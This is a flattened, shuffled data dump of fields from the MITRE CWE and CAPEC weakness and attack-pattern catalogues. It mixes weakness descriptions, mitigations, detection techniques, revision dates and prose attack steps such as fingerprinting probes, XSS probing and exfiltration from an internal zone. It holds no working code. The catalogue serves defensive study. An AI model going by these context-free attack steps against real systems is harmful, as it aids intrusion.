16351	42	If you are using PHP, configure your application so that it does not use register_globals. During implementation, develop your application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues.
22948	32	Yale School of Engineering and Applied Science
17058	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
24000	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
16624	23	This OS fingerprinting probe checks the initial TCP Window size. TCP stacks limit the range of sequence numbers allowable within a session to maintain the "connected" state within TCP protocol logic. The initial window size specifies a range of acceptable sequence numbers that will qualify as a response to an ACK packet within a session. Various operating systems use different Initial window sizes. The initial window size can be sampled by establishing an ordinary TCP connection.
23666	23	The application truncates the display, recording, or processing of security-relevant information in a way that can obscure the source or nature of an attack.
18177	39	2008-09-08
10369	35	MITRE
17525	92	Experiment
14944	79	Integrity
6506	39	2013-07-17
16743	39	2014-07-30
18503	63	Gain Privileges or Assume Identity
12504	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Severity
8936	62	updated Relationships
6246	39	2014-07-30
16668	28	CWE Content Team
21284	79	Confidentiality
10198	92	Exploit
20692	74	2
16020	28	CWE Content Team
17771	50	Inspect registry for changes. Limit privileges of user accounts so changes to default file handlers can only be performed by authorized administrators.
19084	76	2017-08-04
14905	39	2014-06-23
6682	39	2008-09-08
7427	81	Other
7150	28	Eric Dalci
14905	28	CWE Content Team
25247	101	CAPEC Content Team
6919	103	Primary
15556	35	MITRE
21163	62	updated Potential_Mitigations, Time_of_Introduction
15272	62	updated Potential_Mitigations, Relationships
21389	39	2012-10-30
15424	28	CWE Content Team
19879	31	1000
24173	26	Implementation
23120	28	Eric Dalci
11475	81	Confidentiality
14028	62	updated Relationships
9707	31	699
8109	103	Primary
17878	91	Testing
13996	28	CWE Content Team
18007	35	MITRE
20738	104	943
9671	69	Incomplete
14655	73	Intercept or modify a query, or send a bogus query with known credentials (such as transaction ID).
7726	48	09
9658	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.                   Specifically, manual static analysis is useful for evaluating the correctness of allocation calculations. This can be useful for detecting overflow conditions (CWE-190) or similar weaknesses that might have serious security impacts on the program.
20323	88	Path Traversal: 'dir\..\..\filename'
15866	103	Primary
22281	59	Updated Resources_Required
22887	62	updated Relationships, Taxonomy_Mappings
9286	63	Modify Files or Directories
10914	72	This weakness could affect the control flow of the application and allow execution of untrusted code.
24832	62	updated Potential_Mitigations
21635	35	MITRE
13380	28	CWE Content Team
24332	43	Simple
25068	35	MITRE
18630	74	1
18416	91	Architecture and Design
7056	79	Confidentiality
12154	62	updated Relationships
24020	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
17360	103	Primary
23767	76	2019-09-30
16648	31	699
17585	51	2014-06-23
23379	81	Availability
19682	100	The MITRE Corporation
14115	28	CWE Content Team
7303	59	Updated Attack_Prerequisites
23618	97	Transparent Proxy Abuse
7755	35	Cigital
11548	62	updated Time_of_Introduction
19571	28	CWE Content Team
8047	35	MITRE
15011	62	updated Relationships, Type
16248	86	http://blogs.sans.org/appsecstreetfighter/2010/02/23/top-25-series-rank-19-missing-authentication-for-critical-function/
11592	35	MITRE
22064	62	updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships
12536	92	Explore
13484	23	The software uses a one-way cryptographic hash against an input that should not be reversible, such as a password, but the software uses a predictable salt as part of the input.
13057	28	CWE Content Team
18335	100	The MITRE Corporation
10577	33	Taeho Kwon
21893	42	An application must, at all times, keep track of allocated resources and meter their usage appropriately.
8459	49	2006
11777	58	The referer field in HTML requests can be simply modified by malicious users, rendering it useless as a means of checking the validity of the request in question.
6160	62	updated Potential_Mitigations
20317	102	ChildOf
20767	66	Preventing XXE in PHP
21714	76	2015-11-09
18817	39	2018-03-27
9842	43	Simple
15412	28	CWE Content Team
23113	91	Architecture and Design
25282	39	2008-09-08
11083	56	CanPrecede
8706	39	2009-07-27
21575	91	Implementation
11154	39	2009-05-27
17556	28	CWE Content Team
16265	28	CWE Content Team
11434	39	2019-01-03
16430	76	2017-08-04
16157	91	Requirements
10778	35	MITRE
19515	81	Access Control
18499	63	Modify Application Data
11979	28	CWE Content Team
10615	63	Gain Privileges or Assume Identity
5899	51	2014-06-23
9124	48	01
14708	31	699
16499	90	Language-Independent
6732	77	Automated Static Analysis
13300	104	161
21752	91	Architecture and Design
13617	28	CWE Content Team
10243	91	Requirements
17974	39	2009-10-29
7690	40	Differences in the way the two HTTP entities parse HTTP requests
15686	28	CWE Content Team
22708	28	CWE Content Team
10410	28	CWE Content Team
14461	32	The Wikimedia Foundation, Inc
25120	91	Operation
10942	39	2010-06-21
10835	42	Use non-predictable inputs for seed generation.
24333	102	ChildOf
15987	35	MITRE
21753	56	ChildOf
17015	28	CWE Content Team
19627	103	Primary
17756	89	Detailed
14552	91	Architecture and Design
21982	61	Draft
8288	28	CWE Content Team
18666	35	MITRE
10026	23	An attacker changes the behavior or state of a targeted application through injecting data or command syntax through the targets use of non-validated and non-filtered arguments of exposed services or methods.
20381	54	High
21403	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
11774	47	Gain Privileges
17229	62	updated Relationships
13492	56	ChildOf
20434	35	MITRE
22225	28	CWE Content Team
22730	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings
19389	55	CAPEC Content Team
19527	81	Confidentiality
12635	39	2012-05-11
10465	62	updated Description, Other_Notes, Relationship_Notes, Weakness_Ordinalities
20679	35	MITRE
19402	28	CWE Content Team
16362	28	CWE Content Team
24674	35	MITRE
9097	81	Confidentiality
23636	49	2002
25202	103	Primary
13164	40	Advanced knowledge of software and hardware capabilities of a manufacturer's product.
12854	95	[Access & exfiltrate data within the victim's security zone] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise.
22004	47	Read Data
17439	35	MITRE
24843	62	updated Potential_Mitigations
10869	35	MITRE
15642	28	CWE Content Team
22738	35	MITRE
10261	26	Architecture and Design
23079	42	The application configuration should ensure that SSL or an encryption mechanism of equivalent strength and vetted reputation is used for all access-controlled pages.
12851	90	Language-Independent
16647	56	ChildOf
5807	40	The use of the file must be controlled by the file extension.
14310	57	Indirect
8785	96	2008-09-09
23304	35	MITRE
20081	43	Simple
6147	39	2017-11-08
19053	95	[Redirect the access to libraries to the malicious libraries] The attacker redirects the target to the malicious libraries he crafted in the Experiment phase. The attacker will be able to force the targeted application to execute arbitrary code when the application attempts to access the legitimate libraries.
7088	91	Implementation
14209	26	Implementation
6088	42	Use industry standard APIs to synchronize your code.
22940	69	Draft
10457	35	MITRE
23736	51	2014-06-23
12218	32	The Open Web Application Security Project (OWASP)
6177	56	ChildOf
17980	62	updated Relationships
13933	39	2008-07-01
13855	101	CAPEC Content Team
18936	25	Low
15274	62	updated References, Relationships
9691	88	Improper Following of a Certificate's Chain of Trust
19617	28	CWE Content Team
15192	91	Implementation
19787	35	MITRE
17954	63	Modify Application Data
6743	50	To mitigate this type of an attack, an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.
9998	28	CWE Content Team
16993	35	MITRE
18829	39	2008-07-01
18047	21	Anonymous Tool Vendor (under NDA)
12127	34	This weakness may occur when developers do not correctly use a provided input validation framework.
12589	103	Primary
10734	31	1000
20745	33	Web Application Security Consortium
14829	49	2013
17290	31	1000
12506	84	22
15130	39	2017-01-19
8104	39	2011-03-29
13156	28	CWE Content Team
13774	59	Updated Attack_Phases, Description, Description Summary, Solutions_and_Mitigations
9606	103	Primary
23250	28	CWE Content Team
17779	91	Implementation
13537	85	628
13055	97	Collect Data from Common Resource Locations
16752	97	Pretexting via Delivery Person
21007	100	The MITRE Corporation
24858	91	Implementation
11084	33	Yuriy Bulygin
6716	39	2010-12-13
7292	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
24477	28	Eric Dalci
11249	81	Integrity
16978	79	Integrity
10020	76	2019-04-04
23378	86	http://cve.mitre.org/docs/docs-2007/unforgivable.pdf
10031	56	ChildOf
22792	39	2017-11-08
5882	79	Confidentiality
15899	53	The MITRE Corporation
12395	81	Confidentiality
8015	35	MITRE
10103	28	CWE Content Team
11316	88	Improper Privilege Management
12699	56	ChildOf
19671	31	1000
16946	59	Updated References
20330	103	Primary
7021	35	MITRE
12325	39	2014-07-30
24730	42	Before parsing XML files with associated DTDs, scan for recursive entity declarations and do not continue parsing potentially explosive content.
16765	39	2017-11-08
7438	39	2019-01-03
22065	45	Variant
22839	35	MITRE
15428	49	2008
8718	91	Architecture and Design
11221	35	MITRE
11624	43	Simple
15043	28	CWE Content Team
9779	91	Requirements
19112	35	MITRE
21417	24	MITRE
11212	88	Absolute Path Traversal
16284	53	The MITRE Corporation
22377	62	updated Description
6650	62	updated Common_Consequences
8154	79	Confidentiality
23442	62	updated Observed_Examples, References, Relationships
24743	39	2017-11-08
8210	28	CWE Content Team
24260	103	Primary
19649	103	Primary
6884	88	Executable Regular Expression Error
11752	28	CWE Content Team
10178	103	Primary
9588	100	The MITRE Corporation
13117	39	2011-06-01
23242	91	Implementation
6071	28	CWE Content Team
16018	21	CLASP
19475	52	Manual static analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. If denial-of-service is not considered a significant risk, or if there is strong emphasis on consequences such as code execution, then manual analysis may not focus on this weakness at all.
25092	35	MITRE
6388	28	CWE Content Team
19637	72	Attackers can read sensitive information by accessing the unrestricted storage mechanism.
22393	88	Reliance on Undefined, Unspecified, or Implementation-Defined Behavior
10787	56	ChildOf
23533	35	MITRE
13558	103	Primary
11803	62	updated Applicable_Platforms, Causal_Nature, Observed_Examples, Relationships, Taxonomy_Mappings
17114	85	531
8991	43	Simple
9700	35	MITRE
16629	39	2009-12-28
20891	46	Data can "bleed" from one session to another through member variables of singleton objects, such as Servlets, and objects from a shared pool.             In the case of Servlets, developers sometimes do not understand that, unless a Servlet implements the SingleThreadModel interface, the Servlet is a singleton; there is only one instance of the Servlet, and that single instance is used and re-used to handle multiple requests that are processed simultaneously by different threads. A common result is that developers use Servlet member fields in such a way that one user may inadvertently see another user's data. In other words, storing user data in Servlet member fields introduces a data access race condition.
6614	28	CWE Content Team
23059	103	Primary
10253	63	DoS: Resource Consumption (Memory)
11054	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
25183	28	CWE Content Team
17152	28	CWE Content Team
13935	35	MITRE
7269	104	498
22543	66	Can we please stop saying that XSS is boring and easy to fix!
6708	103	Primary
11928	80	To land and launch a script on victim's machine with appropriate footprinting logic for enumerating services and vulnerabilities in JavaScript
25009	28	Eric Dalci
15278	23	The product relies on third-party components that are not      actively supported or maintained by the original developer or a trusted proxy      for the original developer.
22742	35	MITRE
13459	28	Eric Dalci
10785	35	MITRE
19737	100	The MITRE Corporation
14913	56	ChildOf
19463	53	The MITRE Corporation
15251	28	CWE Content Team
23746	23	The software modifies the SSL context after connection creation has begun.
10110	56	ChildOf
18734	28	CWE Content Team
24504	31	1000
9298	28	CWE Content Team
16556	62	updated Demonstrative_Examples, Description, Potential_Mitigations
10864	26	Implementation
16632	77	Black Box
17943	56	ChildOf
11078	62	updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Description, Name, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Taxonomy_Mappings
15386	47	Other
17933	103	Primary
7375	35	Cigital
8185	74	3
14263	81	Confidentiality
9746	35	MITRE
18174	35	MITRE
7895	35	MITRE
8337	62	updated Affected_Resources, Modes_of_Introduction, Relationships, Taxonomy_Mappings
21608	73	The adversary leveraged cross-frame scripting to craft a malicious clickjacking page
18227	47	Read Data
13409	62	updated Potential_Mitigations
10528	31	1000
18639	44	SOAR Partial
9947	31	1000
23742	81	Integrity
6020	53	The MITRE Corporation
9723	51	2014-06-23
8553	94	Run Arbitrary Code
18104	101	CAPEC Content Team
22024	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Type
12360	45	Variant
24202	28	CWE Content Team
10914	81	Confidentiality
12361	56	ChildOf
14825	81	Other
16569	28	Eric Dalci
10011	69	Draft
20066	23	An attacker exploits a weakness in the configuration of access controls and is able to bypass the intended protection that these measures guard against and thereby obtain unauthorized access to the system or network. Sensitive functionality should always be protected with access controls. However configuring all but the most trivial access control systems can be very complicated and there are many opportunities for mistakes. If an attacker can learn of incorrectly configured access security settings, they may be able to exploit this in an attack. Most commonly, attackers would take advantage of controls that provided too little protection for sensitive activities in order to perform actions that should be denied to them. In some circumstances, an attacker may be able to take advantage of overly restrictive access control policies, initiating denial of services (if an application locks because it unexpectedly failed to be granted access) or causing other legitimate actions to fail due to security. The latter class of attacks, however, is usually less severe and easier to detect than attacks based on inadequate security restrictions. This attack pattern differs from CAPEC 1, "Accessing Functionality Not Properly Constrained by ACLs" in that the latter describes attacks where sensitive functionality lacks access controls, where, in this pattern, the access control is present, but incorrectly configured.
10452	56	PeerOf
24530	56	ChildOf
15559	95	[Deceive user into visiting domain] Finally, the adversary needs to deceive a user into visiting the SoundSquatted domain.
12375	52	Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself.
8287	81	Other
11607	39	2014-07-30
21669	31	699
9246	35	MITRE
19472	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
9046	62	updated Relationships, Taxonomy_Mappings
16367	45	Base
19110	35	MITRE
9358	59	Updated References
16434	28	CWE Content Team
18616	81	Integrity
17055	43	Simple
8646	63	Modify Files or Directories
14843	51	2014-06-23
21468	76	2019-09-30
9322	56	ChildOf
5800	50	Abide by the least privilege principle to avoid assigning users more privileges than necessary.
13780	63	Bypass Protection Mechanism
25387	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
10540	62	updated Common_Consequences, Demonstrative_Examples, Description, Other_Notes, Potential_Mitigations, References
11797	40	This attack requires the ability to conduct deep packet inspection with an In-Path device that can drop the targeted traffic and/or connection.
19097	39	2012-10-30
19805	39	2010-09-27
24124	88	Signal Handler Use of a Non-reentrant Function
7830	56	CanAlsoBe
23214	39	2012-10-30
6905	49	2009
9116	57	Primary
24698	62	updated Common_Consequences
9732	45	Class
14453	62	updated References
13081	52	Use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process and also sniff the network connection. Trigger features related to product updates or plugin installation, which is likely to force a code download. Monitor when files are downloaded and separately executed, or if they are otherwise read back into the process. Look for evidence of cryptographic library calls that use integrity checking.
23732	56	ChildOf
23821	39	2008-09-08
24358	91	Implementation
15952	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Related_Weaknesses, Typical_Likelihood_of_Exploit, Typical_Severity
21071	81	Availability
21051	47	Bypass Protection Mechanism
19860	57	Primary
20275	56	ChildOf
7593	56	ChildOf
9576	54	Medium
10820	63	Modify Application Data
16320	62	updated Potential_Mitigations
21238	61	Draft
12212	26	Architecture and Design
8883	25	Low
11675	31	1000
24067	39	2012-05-11
10240	55	CAPEC Content Team
7736	35	MITRE
18727	81	Non-Repudiation
6763	33	Johannes Ullrich
22280	39	2008-10-14
8526	46	This issue makes it more difficult to understand and/or maintain the software due to inconsistencies, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
16463	28	CWE Content Team
21617	28	CWE Content Team
22615	79	Access Control
15740	56	ChildOf
16943	91	Implementation
6667	96	2018-07-02
11498	28	CWE Content Team
16278	62	updated Relationships
12780	28	CWE Content Team
19961	47	Other
6911	100	The MITRE Corporation
22213	28	CWE Content Team
20084	31	699
16896	56	CanPrecede
24210	62	updated Applicable_Platforms, Description, Name, Other_Notes
20820	85	561
7258	70	Wikipedia
14483	35	MITRE
12777	59	Updated Attack_Prerequisites, Description Summary, References, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations
23255	66	Mass assignment in Rails applications
6271	91	Implementation
15099	62	updated Alternate_Terms, Demonstrative_Examples, Description, Observed_Examples, References, Relationship_Notes, Relationships
11459	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Methods_of_Attack, References, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
18398	39	2012-10-30
17260	54	Medium
13134	61	Stable
14553	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
10348	35	MITRE
13248	35	MITRE
13950	39	2019-01-03
14963	35	MITRE
14506	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could be interpreted as wildcards or matching symbols when they are sent to a downstream component.
7233	39	2014-07-30
21776	62	updated Relationships, Taxonomy_Mappings
10601	56	ChildOf
20959	59	Updated Attack_Motivation-Consequences
13898	55	CAPEC Content Team
14982	62	updated Description
23036	76	2018-07-31
14026	86	http://seclists.org/fulldisclosure/2006/Feb/0040.html
14874	89	Detailed
19762	91	Architecture and Design
15229	62	updated Applicable_Platforms
14158	103	Primary
8120	62	added/updated white box definitions
11497	103	Primary
14471	60	16
20874	72	An attacker could read sensitive data, either by reading the data directly from a data store that is not restricted, or by accessing insufficiently-protected, privileged functionality to read the data.
5859	28	CWE Content Team
12228	35	MITRE
7032	91	Implementation
25416	59	Updated Related_Weaknesses
14620	49	2010
9776	35	MITRE
13992	38	Many incorrect login attempts are detected by the system.
20616	39	2019-01-03
11213	28	CWE Content Team
7099	62	updated Modes_of_Introduction, Relationships
7948	44	High
18199	35	MITRE
20103	94	Run Arbitrary Code
21963	81	Access Control
16905	35	MITRE
24012	86	https://arxiv.org/pdf/1801.08535.pdf
19372	35	MITRE
13669	62	updated Common_Consequences
25279	39	2017-11-08
17356	69	Draft
23163	45	Variant
8797	62	updated Relationships, Other_Notes, Taxonomy_Mappings
20998	28	CWE Content Team
6979	79	Confidentiality
21127	63	Modify Memory
12259	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
11214	23	The software does not lock or does not correctly lock a resource when the software must have exclusive access to the resource.
17122	62	updated Relationships, Taxonomy_Mappings
7570	55	CAPEC Content Team
9837	33	Christopher Kruegel
13572	81	Integrity
17821	55	CAPEC Content Team
14308	35	MITRE
9574	43	Simple
23143	35	MITRE
6998	62	updated Other_Notes
13586	62	updated Time_of_Introduction
12378	102	ChildOf
8529	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
14155	46	An example of data amplification is a "decompression bomb," a small ZIP file that can produce a large amount of data when it is decompressed.
22730	39	2008-09-08
11091	104	573
14959	31	1000
20079	31	699
20613	62	updated Potential_Mitigations
13986	56	ChildOf
20401	63	Bypass Protection Mechanism
23183	104	406
7651	91	Implementation
23501	81	Availability
8867	62	updated Applicable_Platforms, Relationships, Other_Notes, Weakness_Ordinalities
24590	63	Modify Application Data
21471	90	Language-Independent
21463	35	MITRE
24191	25	Medium
18890	39	2008-07-01
17212	72	If the expired pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.
17401	50	3. Suppressing error messages: using error 403 "Forbidden" message exactly like error 404 "Not Found" message.
16969	103	Primary
19613	76	2018-07-31
8939	81	Integrity
10387	28	CWE Content Team
11251	28	CWE Content Team
7647	26	Implementation
13075	39	2011-03-29
11531	63	Other
6090	88	Empty Password in Configuration File
11813	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
19302	31	1000
23245	88	Use of Object without Invoking Destructor Method
17581	35	MITRE
7303	100	The MITRE Corporation
9651	76	2019-04-04
12106	62	updated Common_Consequences
20295	67	Medium
21484	26	Implementation
6491	35	MITRE
17192	62	updated Relationships, Taxonomy_Mappings
10700	28	CWE Content Team
12165	26	Architecture and Design
10006	24	MITRE
10557	59	Updated Example_Instances, Related_Attack_Patterns, Taxonomy_Mappings
19937	78	Very High
8314	62	updated Common_Consequences
10542	63	DoS: Crash, Exit, or Restart
12035	62	updated Potential_Mitigations
13753	28	Eric Dalci
22522	35	MITRE
17894	28	CWE Content Team
18453	69	Incomplete
19085	26	Operation
10201	43	Simple
13245	97	Harvesting Information via API Event Monitoring
6256	79	Integrity
23129	42	Declare returned data which should not be altered as constant or immutable.
21127	81	Confidentiality
16447	91	Implementation
21046	28	CWE Content Team
14129	72	The uninitialized data may contain values that cause program flow to change in ways that the programmer did not intend. For example, if an uninitialized variable is used as an array index in C, then its previous contents may produce an index that is outside the range of the array, possibly causing a crash or an exit in other environments.
16386	81	Access Control
9962	62	updated Applicable_Platforms, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings
9427	39	2009-07-27
11683	39	2012-10-30
13768	81	Availability
6552	31	1000
10643	62	updated Relationships
21716	40	The adversary must have the means and knowledge of how to communicate with the target in some manner.
21540	89	Detailed
20111	35	MITRE
6279	33	Fermin J. Serna
7295	57	Primary
18222	47	Alter Execution Logic
16805	91	Implementation
7246	35	MITRE
18055	28	CWE Content Team
18625	33	Flavio D. Garcia
9309	104	215
10141	81	Other
5973	39	2011-06-01
7690	50	Employing an application firewall can help. However, there are instances of the firewalls being susceptible to HTTP Request Smuggling as well.
20390	31	699
20520	35	MITRE
12530	62	updated Relationships
11292	59	Updated Description Summary, Related_Attack_Patterns
11242	35	MITRE
12030	31	1000
9592	35	MITRE
21144	101	CAPEC Content Team
23906	46	An attacker may be able to conduct cross-site scripting and other attacks against users who have these components enabled.             If an application does not neutralize user controlled data being placed in the header of an HTTP response coming from the server, the header may contain a script that will get executed in the client's browser context, potentially resulting in a cross site scripting vulnerability or possibly an HTTP response splitting attack. It is important to carefully control data that is being placed both in HTTP response header and in the HTTP response body to ensure that no scripting syntax is present, taking various encodings into account.
6989	91	Testing
14897	35	MITRE
7203	67	High
23939	81	Confidentiality
9614	26	Implementation
23163	104	433
13269	62	updated Demonstrative_Examples, Potential_Mitigations, References, Relationships
18643	39	2009-05-27
14238	62	updated Applicable_Platforms
20136	79	Authorization
16815	51	2014-06-23
18511	54	Medium
22147	76	2017-01-09
6313	62	updated Relationships
22701	89	Standard
7528	35	MITRE
9732	88	Externally Controlled Reference to a Resource in Another Sphere
23356	62	updated Common_Consequences, Demonstrative_Examples, References, Relationships
7054	28	CWE Content Team
9574	69	Draft
19734	28	CWE Content Team
16670	42	Do not attempt to process an error or attempt to mask it.
19017	56	ChildOf
16146	33	Dmitry Chastukhin
7472	88	Improper Neutralization of Input Leaders
7207	39	2011-03-29
9169	35	MITRE
20100	45	Variant
6878	95	[Assess Target Runtime Environment] In situations where the runtime environment is not implicitly known, the attacker makes connections to the target system and tries to determine the system's runtime environment. Knowing the environment is vital to choosing the correct delimiters.
21952	91	Architecture and Design
6430	28	CWE Content Team
18976	40	The target must be communicating on a network protocol visible by a network sniffing application.
7153	62	updated Applicable_Platforms, Causal_Nature, Demonstrative_Examples, Likelihood_of_Exploit, References, Relationships, Taxonomy_Mappings, White_Box_Definitions
9315	102	ChildOf
7634	84	15
9346	23	This attack targets programs running with elevated privileges. The attacker would try to leverage a bug in the running program and get arbitrary code to execute with elevated privileges. For instance an attacker would look for programs that write to the system directories or registry keys (such as HKLM, which stores a number of critical Windows environment variables). These programs are typically running with elevated privileges and have usually not been designed with security in mind. Such programs are excellent exploit targets because they yield lots of power when they break. The malicious user try to execute its code at the same level as a privileged system call.
20074	57	Resultant
21837	28	CWE Content Team
15227	91	Implementation
23710	62	updated Description, Name
19218	47	Modify Data
21572	100	The MITRE Corporation
21070	35	MITRE
23864	80	Adversaries must be able to register DNS hostnames/URL’s.
12811	50	Use an abstraction library to abstract away risky APIs. Not a complete solution.
16273	39	2010-02-16
15560	28	CWE Content Team
23764	35	MITRE
19727	35	MITRE
18167	48	03
9841	50	Ensure that sufficient input validation is performed for any potentially untrusted data before it is used in any privileged context or zone
12111	76	2019-04-04
17792	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)                                                                     Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source
10064	28	KDM Analytics
23375	45	Variant
18974	63	DoS: Crash, Exit, or Restart
23771	28	CWE Content Team
15530	79	Access Control
14058	28	CWE Content Team
21017	39	2011-09-13
19170	101	CAPEC Content Team
20876	63	Gain Privileges or Assume Identity
6539	28	Eric Dalci
9867	35	Cigital
10485	28	Eric Dalci
13264	28	CWE Content Team
24944	72	Covert storage channels may provide attackers with important information about the system in question.
6880	26	Implementation
5883	39	2011-09-13
13507	89	Standard
7676	62	updated Related_Attack_Patterns, Relationships, Taxonomy_Mappings
19602	60	25
16605	26	Architecture and Design
12084	31	1000
15136	72	The encrypted communication between a user and a trusted host may be subject to a "man-in-the-middle" sniffing attack.
22685	35	MITRE
12958	23	When a security-critical event occurs, the software either does not record the event or omits important details about the event when logging it.
14538	81	Availability
13863	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
15558	76	2017-05-01
22944	62	updated Common_Consequences
5755	28	CWE Content Team
22150	50	While screen capture is a legitimate and practical function, certain situations and context may require the disabling of this feature.
15273	62	updated Related_Attack_Patterns
8451	78	High
12160	23	An attacker initiates a resource depletion attack where a large number of small XML messages are delivered at a sufficiently rapid rate to cause a denial of service or crash of the target. Transactions such as repetitive SOAP transactions can deplete resources faster than a simple flooding attack because of the additional resources used by the SOAP protocol and the resources necessary to process SOAP messages. The transactions used are immaterial as long as they cause resource utilization on the target. In other words, this is a normal flooding attack augmented by using messages that will require extra processing on the target.
22224	33	Piotr Bania
11111	91	Implementation
6530	35	MITRE
20351	39	2008-09-08
8141	39	2012-05-11
23027	46	This issue makes it more difficult to understand and/or maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
9670	23	An adversary uses a technique to generate an ICMP Error message (Port Unreachable, Destination Unreachable, Redirect, Source Quench, Time Exceeded, Parameter Problem) from a target and then analyze the amount of data returned or "Quoted" from the originating request that generated the ICMP error message. For this purpose "Port Unreachable" error messages are often used, as generating them requires the attacker to send a UDP datagram to a closed port on the target. The goal of this analysis to make inferences about the type of operating system or firmware that sent the error message in reply. This is useful for identifying unique characteristics of operating systems because the RFC-1122 expected behavior reads: "Every ICMP error message includes the Internet header and at least the first 8 data octets of the datagram that triggered the error; more than 8 octets MAY be sent [...]." This contrasts with RFC-792 expected behavior, which limited the quoted text to 64 bits (8 octets). Given the latitude in the specification the resulting RFC-1122 stack implementations often respond with a high degree of variability in the amount of data quoted in the error message because "older" or "legacy" stacks may comply with the RFC-792 specification, while other stacks may choose a longer format in accordance with RFC-1122. As a general rule most operating systems or firmware will quote the first 8 bytes of the datagram triggering the error, but some IP stacks will quote more than the first 8 bytes of data.
16030	63	DoS: Instability
12073	97	Targeted Malware
12507	95	[Spider] Using an automated tool, an attacker follows all public links on a web site. He records all the links he finds.
10166	26	Implementation
18898	73	Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.
12363	49	2008
21119	45	Compound
20924	62	updated Relationships, Taxonomy_Mappings
8192	76	2019-04-04
11850	35	MITRE
9510	91	Implementation
17909	55	CAPEC Content Team
13935	39	2019-01-03
7820	104	581
23033	103	Primary
7871	62	updated Related_Attack_Patterns
21778	90	Language-Independent
16585	21	Evgeny Lebanidze
16330	35	MITRE
13286	35	MITRE
14871	69	Incomplete
8964	91	Architecture and Design
18412	35	MITRE
20525	66	Cross Site Port Attacks - XSPA - Part 1
